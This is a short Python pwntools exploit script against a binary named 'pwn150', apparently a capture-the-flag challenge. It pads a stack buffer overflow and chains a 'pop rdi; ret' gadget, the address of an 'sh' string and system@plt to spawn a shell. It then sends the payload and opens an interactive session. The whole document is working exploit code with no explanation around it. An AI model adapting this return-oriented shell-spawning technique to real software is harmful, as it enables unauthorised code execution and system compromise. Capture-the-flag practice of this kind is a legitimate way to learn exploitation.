from pwn import *
target = "./pwn150"

system_addr = 0x4005e0

p = process(target)
e = ELF(target)
pr = 0x400882
sh = 0x6003ef
pop_rdi_ret = 0x400883

print p.recv()

payload = ""
payload += "A" * 0x50
payload += "B" * 8 # rbp
payload += p64(pop_rdi_ret)
payload += p64(sh)
payload += p64(e.plt["system"])

fd = open("dump150", "w")
fd.write(payload + "\n")
fd.close()

p.sendline(payload)

p.interactive()
